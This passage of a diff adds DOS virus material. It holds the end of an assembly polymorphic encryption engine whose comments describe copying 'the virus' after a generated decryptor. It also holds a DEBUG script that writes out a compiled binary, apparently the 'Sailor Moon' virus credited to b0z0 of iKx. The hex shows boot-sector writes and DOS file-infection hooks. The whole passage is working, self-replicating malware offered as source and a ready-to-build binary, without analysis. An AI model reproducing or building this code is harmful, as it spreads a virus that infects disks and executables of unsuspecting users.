+        jmp     popping_end
+file_aligned:
+        pop     bx
+        mov     al,bl
+        add     al,058h         ; POP last register
+        stosb
+        mov     al,09dh         ; POPF
+        stosb
+        ret                     ; yeah, we finished it :)
+
+do_inc_pointer:
+        call    randomshit              ; some foo instructions
+        mov     al,040h                 ; pointer increment
+        add     al,byte ptr ds:[point_reg]
+        stosb
+        ret
+
+doonebyte:
+        push    dx
+        call    do_random_dx_0f         ; select inc/dec
+        pop     dx
+        ror     al,1
+        mov     al,40h                  ; INC ax
+        jnc     end1b
+        add     al,08h                  ; DEC ax
+
+end1b:
+        ret
+
+init_poly_engine:
+        sub     bx,bx
+        mov     word ptr ds:[enc_lenght],cx     ; save lenght
+        mov     word ptr ds:[enc_loop],3480h    ; engine initialization
+        mov     word ptr ds:[isword],bx         ; clear type selection
+        mov     word ptr ds:[random_value],09090h  ; clear rnd value
+        mov     byte ptr ds:[second_inc],90h    ; clear second word inc
+        mov     byte ptr ds:[push_nr],bl
+        dec     bx
+        mov     word ptr ds:[count_reg],bx      ; clear used registers
+        mov     word ptr ds:[nocx],bx           ; clear cx flag
+        mov     word ptr ds:[registers],bx
+        mov     word ptr ds:[registers+2],bx
+        mov     word ptr ds:[registers+4],bx
+        mov     word ptr ds:[registers+6],bx
+        sub     di,di                           ; so ES:DI = ES:0
+        ret
+
+reset_registers:
+        sub     bx,bx
+        mov     word ptr ds:[registers],bx
+        mov     word ptr ds:[registers+2],bx
+        mov     word ptr ds:[registers+4],bx
+        mov     word ptr ds:[registers+6],bx
+        ret
+
+copy_n_encrypt:
+        push    di                                ; CX = lenght
+        push    cx                                ; DS:DX = code
+        push    dx
+        pop     si
+        rep     movsb                             ; copy the virus after
+        pop     dx                                ; the decryptor
+        pop     si
+        push    es                                ; DX = lenght
+        pop     ds                                ; ES:DI = code to enc
+        cmp     byte ptr cs:[isrolror],00h        ; are we rol(r)ling?
+        je      noro
+        mov     byte ptr cs:[enc_loop],0d2h       ; first byte for ror/rol
+        mov     word ptr cs:[random_value],9090h  ; no random value req
+noro:
+        cmp     byte ptr cs:[isword],00h  ; word operations?
+        je      pre_enc_loop
+        mov     ax,dx
+        inc     ax
+        shr     ax,1
+        mov     dx,ax                     ; calculate lenght in words
+        inc     byte ptr cs:[enc_loop]    ; put word working opcode
+        mov     byte ptr cs:[second_inc],046h   ; put another inc
+pre_enc_loop:
+        db      0b1h                    ; mov cl,
+cl_move db      00h                     ; immediate
+        jmp     enc_loop                ; cpus rules
+
+; Poly data start
+
+original_data:
+enc_lenght      dw      00h
+last_done       db      00h
+reg8bits        db      00h
+cmp_check       db      00h
+cmp_check2      db      00h
+count_reg       db     0ffh
+point_reg       db     0ffh
+pointer_di      dw      00h
+secphs          dw      00h
+isword          db      00h
+isrolror        db      00h
+nocx            db     0ffh
+noints          db     0ffh
+push_nr         db      00h
+
+registers:
+ax_used         db     0ffh
+cx_used         db     0ffh
+dx_used         db     0ffh
+bx_used         db     0ffh
+sp_place        db     0ffh
+bp_used         db     0ffh
+si_used         db     0ffh
+di_used         db     0ffh
+
+; Poly data end
+
+enc_loop:
+;        xor     byte ptr ds:[si],ah
+                db      080h
+                db      034h
+random_value    db      090h
+                db      90h             ; random value2
+
+        inc     si
+
+second_inc      db      90h             ; space for second inc si
+
+        dec     dx
+        jnz     enc_loop
+        mov     di,si
+        ret
+
+instructions:
+
+; the data below this line is of use by the poly to create some of the
+; various possible operations on registers in the trash generation part
+
+;ONE BYTE ONLY
+inc_16       db      040h    ; INC REG16
+dec_16       db      048h    ; DEC REG16
+mov_rr16     db      08bh    ; general first byte
+; + 0 (03h) ADD
+; + 8 (0bh) OR
+; + 10 (13h) ADC
+; + 18 (1bh) SBB
+; + 20 (23h) AND
+; + 28 (2bh) SUB
+; + 30 (33h) XOR
+; + 38 (3bh) CMP
+math_rr16    db      03h    ; basic opcode
+not_neg      db      0d0h
+rot_1        db      0d1h    ; ROL/ROR/SHL/SHR/RCR/RCL/SAR/SAL REG16,1
+rot_cl       db      0d3h    ; ROL REG16,CL
+; +0h (0c0h)     ADD
+; +8h (0c8h)     OR
+; +10h (0d0h)    ADC
+; +18h (0d8h)    SBB
+; +20h (0e0h)    AND
+; +28h (0e8h)    SUB
+; +30h (0f0h)    XOR
+; +38h (0f8h)    CMP
+add_r16i     db      0c0h    ; ADD REG16,IMMEDIATE 2 byte
+lea_reg      db      0b8h    ; LEA REG16,something
+mov_mem      db      06h    ; MOV mem
+
+;=[END SMPOLY.ASM]===========================================================
+
+
+
+;=[BEGIN SMOON.SCR]==========================================================
+
+ N SMOON.COM
+ E 0100 0E E8 01 00 C3 9C 50 53 51 52 56 57 55 1E 06 FB
+ E 0110 FC E8 00 00 58 2D 14 01 B1 04 D3 E8 8C CB 03 C3
+ E 0120 50 B8 26 01 50 CB 0E 1F 81 FC E8 7B 74 37 80 3E
+ E 0130 EC 0E 01 74 11 8B EC 83 6E 18 03 8B 7E 18 8E 46
+ E 0140 16 BE E9 0E A4 A5 0E 07 C6 06 EC 0E 00 B8 53 30
+ E 0150 CD 21 80 FC 30 74 03 E8 6E 00 07 1F 5D 5F 5E 5A
+ E 0160 59 5B 58 9D CB FA BC 00 7C FB 33 C0 8E D8 8E C0
+ E 0170 BE 00 7E 8B FC B9 00 01 F3 A5 A1 4C 00 2E A3 FB
+ E 0180 02 A1 4E 00 2E A3 FD 02 2E C6 06 0A 0F 03 A1 13
+ E 0190 04 2D 05 00 A3 13 04 B1 06 D3 E0 2D 10 00 8E C0
+ E 01A0 0E 1F BE 00 01 8B FE B9 44 08 F3 A5 33 C0 8E D8
+ E 01B0 C7 06 4C 00 72 02 8C 06 4E 00 E8 1E 00 33 C0 8E
+ E 01C0 D8 8E C0 EA 00 7C 00 00 B4 62 CD 21 4B 8E DB A1
+ E 01D0 12 00 2D 81 01 8E C0 E8 11 00 C3 A1 13 04 2D 07
+ E 01E0 00 B1 06 D3 E0 8E C0 E8 01 00 C3 0E 1F B8 01 02
+ E 01F0 33 DB B9 01 00 BA 80 01 E8 01 06 26 80 7F 01 45
+ E 0200 75 02 EB 6B B8 01 03 50 33 DB B9 02 00 BA 80 00
+ E 0210 E8 E9 05 BE C6 07 33 FF B9 03 00 F3 A4 BF 47 00
+ E 0220 B9 09 00 F3 A4 06 8C C0 05 05 00 8E C0 2B C0 B9
+ E 0230 2A 00 BA D2 07 E8 DE 05 0E 1F 81 F9 AE 01 77 ED
+ E 0240 07 26 C7 06 FE 01 55 AA 58 33 DB B9 01 00 BA 80
+ E 0250 01 E8 A8 05 B0 01 B9 07 0E BA 00 01 E8 B7 05 0E
+ E 0260 1F B8 0D 03 33 DB B9 03 00 BA 80 00 E8 8D 05 0E
+ E 0270 07 C3 2E 80 3E 0A 0F 00 75 1A 83 F9 01 75 15 81
+ E 0280 FA 80 01 75 0F 51 52 B9 02 00 B6 00 E8 76 05 5A
+ E 0290 59 CA 02 00 80 FC 02 75 4D 2E 80 3E 0A 0F 00 74
+ E 02A0 45 9C 2E FF 1E FB 02 9C 26 81 3F 4D 5A 75 33 2E
+ E 02B0 FE 0E 0A 0F 2E 80 3E 0A 0F 00 75 26 2E C6 06 4D
+ E 02C0 0F 00 50 1E 33 C0 8E D8 A1 84 00 2E A3 0C 04 A1
+ E 02D0 86 00 2E A3 0E 04 C7 06 84 00 01 04 8C 0E 86 00
+ E 02E0 1F 58 9D CA 02 00 3D 01 02 75 0F 83 F9 01 75 0A
+ E 02F0 80 FE 00 75 05 80 FA 01 76 05 EA 00 00 00 00 9C
+ E 0300 2E FF 1E FB 02 9C 50 53 51 52 56 57 55 1E 06 73
+ E 0310 08 E9 E0 00 5B 07 E9 DB 00 FB FC 0E 1F 26 80 7F
+ E 0320 01 45 75 0D B8 01 02 B9 01 4F B6 01 E8 D6 04 EB
+ E 0330 E0 26 81 7F 13 40 0B 75 D8 06 53 0E 07 BB 87 0F
+ E 0340 B8 01 02 B9 09 00 2A F6 E8 BA 04 8B FB 81 C7 96
+ E 0350 00 26 83 7D 01 00 75 BC 5B 1F 8B F3 8C C8 05 10
+ E 0360 00 05 E1 00 8E C0 33 FF B9 00 01 F3 A5 0E 1F B8
+ E 0370 01 03 33 DB B9 01 4F B6 01 E8 89 04 73 02 EB 74
+ E 0380 BE C6 07 33 FF B9 03 00 F3 A4 BF 47 00 B9 09 00
+ E 0390 F3 A4 8C C0 05 05 00 8E C0 52 2B C0 B9 2A 00 BA
+ E 03A0 D2 07 E8 71 04 0E 1F 81 F9 AE 01 77 ED 26 C7 06
+ E 03B0 FE 01 55 AA 5A 8C C0 2D 05 00 8E C0 B8 01 03 33
+ E 03C0 DB B9 01 00 B6 00 E8 3C 04 72 29 33 ED 52 B8 01
+ E 03D0 02 33 DB B9 03 00 03 CD BA 80 00 E8 27 04 5A B8
+ E 03E0 01 03 33 DB B9 02 4F 03 CD B6 01 E8 17 04 45 83
+ E 03F0 FD 0D 75 D9 07 1F 5D 5F 5E 5A 59 5B 58 9D CA 02
+ E 0400 00 3D 53 30 74 0A 3D 00 4B 74 06 EA 00 00 00 00
+ E 0410 CF 50 53 51 52 56 57 55 1E 06 FB FC 0E 07 8B F2
+ E 0420 BF 0B 0F B9 40 00 F3 A4 0E 1F C6 06 15 05 00 B8
+ E 0430 00 3D BA 0B 0F CD 21 73 03 E9 86 00 8B D8 B4 3F
+ E 0440 B9 20 00 BA 4D 0F CD 21 3B C1 75 69 81 3E 4D 0F
+ E 0450 5A 4D 74 61 81 3E 4D 0F 4D 5A 74 59 B8 00 57 CD
+ E 0460 21 83 E1 1F 83 F9 07 74 4C B8 02 42 33 C9 33 D2
+ E 0470 CD 21 83 FA 00 75 3E 3D E8 03 72 39 3D D8 D6 77
+ E 0480 34 A3 4B 0F B8 03 35 CD 21 89 1E 71 0F 8C 06 73
+ E 0490 0F B0 13 CD 21 89 1E D4 05 8C 06 D6 05 C6 06 15
+ E 04A0 05 01 0E 07 B8 03 25 BA 16 05 CD 21 B0 13 BA 9F
+ E 04B0 05 CD 21 EB 05 C6 06 4D 0F 00 B4 3E CD 21 B4 0D
+ E 04C0 CD 21 07 1F 5D 5F 5E 5A 59 5B 58 9C 2E FF 1E 0C
+ E 04D0 04 2E C6 06 4D 0F 00 9C 50 52 1E 2E 80 3E 15 05
+ E 04E0 00 74 2B B8 01 25 2E 8B 16 6D 0F 2E 8E 1E 6F 0F
+ E 04F0 CD 21 B0 03 2E 8B 16 71 0F 2E 8E 1E 73 0F CD 21
+ E 0500 B0 13 2E 8B 16 D4 05 2E 8E 1E D6 05 CD 21 1F 5A
+ E 0510 58 9D CA 02 00 00 9C 50 53 51 52 56 57 55 1E 06
+ E 0520 FB FC 0E 1F BE 4D 0F BF 00 01 B9 20 00 F3 A4 C6
+ E 0530 06 4D 0F 00 B4 0D CD 21 BF 00 01 03 3E 4B 0F B0
+ E 0540 53 B9 15 2A F3 AA 8C 06 79 0F B8 01 35 CD 21 89
+ E 0550 1E 6D 0F 8C 06 6F 0F B4 25 BA D8 05 CD 21 B0 03
+ E 0560 8B 16 71 0F 8E 1E 73 0F CD 21 B0 13 2E 8B 16 D4
+ E 0570 05 2E 8E 1E D6 05 CD 21 0E 1F E4 40 24 03 8A E0
+ E 0580 E4 40 05 00 01 A3 7B 0F 07 1F 5D 5F 5E 5A 59 5B
+ E 0590 58 9D 55 8B EC FF 4E 02 81 4E 06 00 01 5D CF 2E
+ E 05A0 80 3E 4D 0F 00 74 2C 80 FC 02 75 27 9C 2E FF 1E
+ E 05B0 D4 05 72 1C 9C 51 56 57 1E 0E 1F BE 4D 0F 8B FB
+ E 05C0 B9 20 00 F3 A6 75 04 26 C6 07 CC 1F 5F 5E 59 9D
+ E 05D0 CA 02 00 EA 00 00 00 00 55 8B EC 50 8B 46 04 2E
+ E 05E0 39 06 79 0F 58 75 0D 2E 83 3E 7B 0F 00 74 07 2E
+ E 05F0 FF 0E 7B 0F 5D CF FB FC 50 56 1E C5 76 02 8A 04
+ E 0600 3C BF 77 04 3C B8 73 1A 3C E8 74 16 3C E9 74 12
+ E 0610 3C 80 75 09 8A 44 01 24 C0 3C C0 74 05 1F 5E 58
+ E 0620 EB D2 2E 89 36 7D 0F 2E 81 2E 7D 0F 00 01 57 06
+ E 0630 0E 07 BF E9 0E A4 A5 07 5F 1F 5E 58 50 53 51 52
+ E 0640 56 57 55 1E 06 2E 8E 1E 79 0F 2E 8B 36 4B 0F 81
+ E 0650 C6 00 01 B9 15 2A 33 DB AC 3C 53 75 03 43 EB 02
+ E 0660 33 DB 81 FB 47 0E 74 28 E2 EE 07 1F 5D 5F 5E 5A
+ E 0670 59 5B 58 50 52 1E B8 01 25 2E 8B 16 6D 0F 2E 8E
+ E 0680 1E 6F 0F CD 21 1F 5A 58 81 66 06 FF FE E9 64 FF
+ E 0690 81 EE 27 0E 83 E6 F0 81 EE 00 01 2E 89 36 7F 0F
+ E 06A0 B8 24 35 CD 21 2E 89 1E 75 0F 2E 8C 06 77 0F 0E
+ E 06B0 1F 0E 07 B4 25 BA C3 07 CD 21 B8 00 43 BA 0B 0F
+ E 06C0 CD 21 89 0E 81 0F B8 01 43 BA 0B 0F 33 C9 CD 21
+ E 06D0 B8 02 3D BA 0B 0F CD 21 73 03 E9 D6 00 8B D8 B8
+ E 06E0 00 57 CD 21 89 0E 83 0F 89 16 85 0F B8 00 42 33
+ E 06F0 C9 8B 16 7D 0F CD 21 B4 3F B9 03 00 BA 07 0F CD
+ E 0700 21 BE E9 0E BF 07 0F B9 03 00 F3 A6 74 03 E9 85
+ E 0710 00 A1 83 0F 25 1F 00 3D 05 00 72 08 3D 06 00 77
+ E 0720 03 40 EB 03 B8 05 00 83 26 83 0F E0 09 06 83 0F
+ E 0730 B8 00 42 33 C9 8B 16 7D 0F CD 21 A1 7F 0F 2B 06
+ E 0740 7D 0F 2D 03 00 A3 EE 0E 53 B4 62 CD 21 4B 8E DB
+ E 0750 A1 12 00 2D 81 01 8E C0 5B 0E 1F B4 40 B9 03 00
+ E 0760 BA ED 0E CD 21 B8 00 42 33 C9 8B 16 7F 0F CD 21
+ E 0770 0E 1F B0 02 B9 07 0E BA 00 01 E8 99 00 B4 40 CD
+ E 0780 21 B8 40 00 8E D8 E4 40 B4 00 8B C8 B4 40 33 D2
+ E 0790 CD 21 0E 1F 0E 07 B8 01 57 8B 0E 83 0F 8B 16 85
+ E 07A0 0F CD 21 B4 3E CD 21 B8 01 43 8B 0E 81 0F BA 0B
+ E 07B0 0F CD 21 B8 24 25 8B 16 75 0F 8E 1E 77 0F CD 21
+ E 07C0 E9 A7 FE B0 03 CF EB 45 90 FA 33 C0 8E D0 BC 00
+ E 07D0 7C 52 5A 0E 1F 0E 07 FB FC 80 FA 80 75 07 B9 02
+ E 07E0 00 B6 00 EB 07 B9 01 4F B6 01 EB 00 B8 0D 02 BB
+ E 07F0 00 7E CD 13 72 F6 81 C3 00 02 FF E3 50 CD 13 58
+ E 0800 73 02 CD 13 C3 50 9C 2E FF 1E FB 02 58 73 06 9C
+ E 0810 2E FF 1E FB 02 C3 FC 53 51 1E 52 E8 11 06 50 3C
+ E 0820 02 75 0A C6 06 C9 0E 00 E8 88 00 EB 03 E8 3A 06
+ E 0830 C6 06 CA 0E 01 E8 C7 03 58 50 3C 02 75 14 C7 06
+ E 0840 C8 0E 0F 00 C7 06 C0 0E 0F 0F C6 06 CA 0E 00 E8
+ E 0850 57 05 58 3C 00 74 42 3C 01 74 08 A1 7F 0F 05 00
+ E 0860 01 EB 39 C6 06 BF 0E 01 8B D7 83 E2 0F 74 25 80
+ E 0870 FA 0D 73 08 B9 01 00 E8 7C 00 EB E7 E8 A2 05 50
+ E 0880 BB 07 00 8B D3 E8 1C 02 3C 04 74 F4 8A C8 58 02
+ E 0890 C1 AA EB CF B8 00 80 EB 03 B8 50 7C 8B 36 C2 0E
+ E 08A0 03 C7 26 89 04 5A 1F 59 E8 D2 05 06 1F 2B D2 8B
+ E 08B0 CF 5B C3 B0 9C AA 2B C9 E8 E4 01 3C 04 74 F9 8B
+ E 08C0 D8 80 BF CB 0E FF 75 F0 88 8F CB 0E 04 50 AA 51
+ E 08D0 E8 13 00 59 41 80 F9 07 73 02 EB DC B0 1E AA B9
+ E 08E0 08 00 E8 01 00 C3 BB 0F 00 8B D3 E8 B6 01 3C 00
+ E 08F0 74 F9 8A C8 2A ED BA 07 00 8B DA E8 A6 01 3C 04
+ E 0900 74 F4 3A 06 C0 0E 74 EE 3A 06 C1 0E 74 E8 3A 06
+ E 0910 C8 0E 74 E2 8B D8 80 BF CB 0E FF 74 D9 86 E0 C6
+ E 0920 06 BD 0E 00 E8 03 00 E2 CD C3 51 50 BE DF 0E BB
+ E 0930 09 00 BA 0F 00 E8 6C 01 3A 06 BC 0E 74 F1 A2 BC
+ E 0940 0E 03 F0 3D 01 00 76 69 3D 07 00 72 03 E9 C0 00
+ E 0950 3D 02 00 74 0D 3D 04 00 74 70 3D 05 00 72 03 E9
+ E 0960 8F 00 8A 04 73 14 50 E8 35 01 8A C8 80 F9 07 75
+ E 0970 05 C6 06 BE 0E 01 58 E8 4E 01 AA E8 21 01 8A C8
+ E 0980 58 B0 C0 80 FC 04 73 15 50 E8 13 01 8A E8 58 D0
+ E 0990 CD 72 0A 26 FE 4D FF D0 CD 73 02 04 20 02 C1 8A
+ E 09A0 CC E8 24 01 AA 83 3E BE 0E 01 75 03 E8 0B 02 59
+ E 09B0 C3 58 8A 04 02 C4 AA 80 3E CB 0E FF 74 0A E8 DE
+ E 09C0 00 3C 05 72 03 E8 28 01 59 C3 B0 F7 AA E8 CF 00
+ E 09D0 8A C8 58 51 8A 04 02 C4 D0 E9 72 02 04 08 59 80
+ E 09E0 3E CA 0E 01 77 08 80 F9 02 75 03 E9 AD 01 AA 59
+ E 09F0 C3 8A 04 AA B0 C0 E8 A6 00 8A C8 58 80 F9 06 75
+ E 0A00 02 FE C1 B0 C0 E8 CC 00 02 C4 E8 BB 00 AA 59 C3
+ E 0A10 3D 08 00 74 32 3D 09 00 74 52 B0 83 AA E8 7F 00
+ E 0A20 8A C8 80 F9 07 75 05 C6 06 BE 0E 01 8A 04 E8 97
+ E 0A30 00 8A D8 58 8A C3 E8 9B 00 02 C4 AA BB FF 00 8B
+ E 0A40 D3 E8 60 00 E9 5D FF B1 B8 58 80 FC 04 73 16 50
+ E 0A50 E4 40 D0 C8 73 0E C6 06 BD 0E 01 B1 B0 D0 C8 73
+ E 0A60 03 80 C1 04 58 8A C1 02 C4 AA EB 1E E4 40 D0 E8
+ E 0A70 73 0C D0 E8 72 05 B0 26 AA EB 03 B0 2E AA B0 8B
+ E 0A80 AA 58 8A 04 8A CC E8 3F 00 AA BB FF 3F 8B D3 E8
+ E 0A90 12 00 AA 86 C4 80 3E BD 0E 01 74 01 AA 59 C3 BB
+ E 0AA0 07 00 8B D3 E8 0E 00 3A 06 B4 0A 75 03 E8 05 00
+ E 0AB0 A2 B4 0A C3 FF E4 40 8A E0 E4 40 D0 C8 D0 C8 32
+ E 0AC0 C4 23 C2 3B C3 77 EE C3 80 F9 00 74 06 04 08 FE
+ E 0AD0 C9 EB F5 C3 80 FC 04 73 16 50 E8 C2 FF 8A E8 D0
+ E 0AE0 CD 58 73 0B 26 80 6D FF 01 D0 CD 73 02 04 04 C3
+ E 0AF0 80 3E C9 0E 00 74 01 C3 4F BB 0A 00 BA 0F 00 E8
+ E 0B00 A2 FF 8A E8 B0 B4 80 3E CC 0E FF 74 67 80 3E CD
+ E 0B10 0E FF 74 60 80 3E CE 0E FF 74 27 80 FD 04 76 22
+ E 0B20 80 FD 06 76 4F 80 FD 09 77 0D 80 FD 07 74 04 B4
+ E 0B30 30 EB 62 B4 62 EB 5E B4 48 AB B0 BB AA 2B C0 48
+ E 0B40 EB 53 80 FD 01 76 0E 80 FD 03 73 16 B4 06 AB B0
+ E 0B50 B2 B4 FF EB 40 B4 2A 80 FD 00 74 04 FE C4 FE C4
+ E 0B60 EB 33 B0 B8 AA B0 05 B4 33 80 FD 04 74 27 2A C0
+ E 0B70 B4 58 EB 21 BB 02 00 BA 03 00 50 E8 26 FF 8A E8
+ E 0B80 58 80 FD 01 74 0D 80 FD 02 74 04 B4 0B EB 06 B4
+ E 0B90 54 EB 02 B4 19 AB B8 CD 21 AB C3 4F FE 06 CA 0E
+ E 0BA0 50 E8 FB FE 86 C4 B0 50 02 C4 AA E8 42 00 58 B0
+ E 0BB0 58 02 C4 AA 59 FE 0E CA 0E C3 C6 06 BF 0E 01 BB
+ E 0BC0 06 00 BA 07 00 E8 DC FE 3C 06 75 04 B0 EB EB 06
+ E 0BD0 8A E0 B0 72 02 C4 AA 57 AA E8 14 00 8B C7 5F 50
+ E 0BE0 2B C7 48 AA 5F C6 06 BE 0E 00 C6 06 BF 0E 00 C3
+ E 0BF0 E8 AC FE 3C 00 74 F9 8A C8 2A ED E8 F8 FC C3 E8
+ E 0C00 93 01 C6 06 C9 0E 0F E8 95 FE 3C 04 74 F9 A2 C0
+ E 0C10 0E 8A E0 B0 B8 02 C4 AA E8 84 FE 3C 02 77 0C 26
+ E 0C20 80 7D FF B9 74 05 C6 06 C7 0E 01 D0 C8 A1 BA 0E
+ E 0C30 72 08 C6 06 C6 0E 01 40 D1 E8 AB E8 57 01 E8 5E
+ E 0C40 FE 3C 03 72 F9 3C 04 74 F5 3A 06 C0 0E 74 EF A2
+ E 0C50 C1 0E 8A E0 B0 B8 02 C4 AA 89 3E C2 0E AB E8 34
+ E 0C60 01 80 3E C7 0E 00 74 1B B0 B1 AA BB 0F 00 8B D3
+ E 0C70 E8 31 FE 3C 00 74 F4 AA A2 B7 0E C6 06 C8 0E 01
+ E 0C80 E8 12 01 89 3E C4 0E 57 E8 0A 01 58 D0 C8 72 0E
+ E 0C90 B0 0E AA E8 FF 00 B0 1F AA E8 F9 00 EB 03 B0 2E
+ E 0CA0 AA 80 3E C7 0E 00 74 44 B0 D2 80 3E C6 0E 00 74
+ E 0CB0 02 FE C0 AA E8 E8 FD D0 C8 B0 04 73 09 04 08 C6
+ E 0CC0 06 D4 0E 04 EB 05 C6 06 D4 0E 0C 80 3E C1 0E 06
+ E 0CD0 74 17 FE C0 80 3E C1 0E 07 74 0E 04 02 80 3E C1
+ E 0CE0 0E 03 74 05 04 3F AA 2A C0 AA EB 65 B0 80 80 3E
+ E 0CF0 C6 0E 00 74 02 FE C0 AA BB 02 00 BA 03 00 E8 A3
+ E 0D00 FD 8A C8 B0 34 80 F9 00 74 15 80 F9 01 75 09 2C
+ E 0D10 30 C6 06 D4 0E 2C EB 07 2C 08 C6 06 D4 0E 04 80
+ E 0D20 3E C1 0E 06 74 17 FE C0 80 3E C1 0E 07 74 0E 04
+ E 0D30 02 80 3E C1 0E 03 74 05 04 3F AA 2A C0 AA E4 40
+ E 0D40 A2 D5 0E AA 80 3E C6 0E 00 74 06 E4 40 A2 D6 0E
+ E 0D50 AA E8 C2 00 80 3E C6 0E 00 74 03 E8 B8 00 E8 34
+ E 0D60 00 B0 48 02 06 C0 0E AA E8 34 FD D0 E8 73 02 EB
+ E 0D70 10 E8 21 00 B0 83 AA B0 F8 02 06 C0 0E AA 2A C0
+ E 0D80 AA B0 74 AA B0 03 AA B0 E9 AA 8B C7 40 2B 06 C4
+ E 0D90 0E F7 D0 AB C3 BB 0F 00 8B D3 E8 07 FD 3C 00 74
+ E 0DA0 F4 8A C8 2A ED E8 4E FB C3 E8 3A FB B0 1F AA E8
+ E 0DB0 34 FB B9 06 00 2B DB 4B 43 38 8F CB 0E 75 F9 8A
+ E 0DC0 C3 C6 87 CB 0E FF 04 58 AA 49 51 E8 18 FB 59 E3
+ E 0DD0 02 EB E2 C6 06 BF 0E 01 2B DB 4B 43 80 BF CB 0E
+ E 0DE0 00 75 F8 53 8A E3 8B D7 42 42 83 E2 0F 74 1D 80
+ E 0DF0 FA 0D 73 0A B9 01 00 50 E8 FB FA 58 EB E8 50 E8
+ E 0E00 1F 00 8A C8 58 8A C1 02 C4 AA EB DA 5B 8A C3 04
+ E 0E10 58 AA B0 9D AA C3 E8 7C FF B0 40 02 06 C1 0E AA
+ E 0E20 C3 52 E8 7A FC 5A D0 C8 B0 40 73 02 04 08 C3 2B
+ E 0E30 DB 89 0E BA 0E C7 06 D3 0E 80 34 89 1E C6 0E C7
+ E 0E40 06 D5 0E 90 90 C6 06 D8 0E 90 88 1E CA 0E 4B 89
+ E 0E50 1E C0 0E 89 1E C8 0E 89 1E CB 0E 89 1E CD 0E 89
+ E 0E60 1E CF 0E 89 1E D1 0E 2B FF C3 2B DB 89 1E CB 0E
+ E 0E70 89 1E CD 0E 89 1E CF 0E 89 1E D1 0E C3 57 51 52
+ E 0E80 5E F3 A4 5A 5E 06 1F 2E 80 3E C7 0E 00 74 0D 2E
+ E 0E90 C6 06 D3 0E D2 2E C7 06 D5 0E 90 90 2E 80 3E C6
+ E 0EA0 0E 00 74 12 8B C2 40 D1 E8 8B D0 2E FE 06 D3 0E
+ E 0EB0 2E C6 06 D8 0E 46 B1 00 EB 19 00 00 00 00 00 00
+ E 0EC0 FF FF 00 00 00 00 00 00 FF FF 00 FF FF FF FF FF
+ E 0ED0 FF FF FF 80 34 90 90 46 90 4A 75 F7 8B FE C3 40
+ E 0EE0 48 8B 03 D0 D1 D3 C0 B8 06 00 00 00 01 E8 00 00
+ E 0EF0 00 53 61 69 6C 6F 72 5F 4D 6F 6F 6E 00 2D 62 30
+ E 0F00 7A 30 2F 69 4B 78 2D
+ RCX
+ 0E07
+ W
+ Q
+
+;=[END SMOON.SCR]============================================================
+
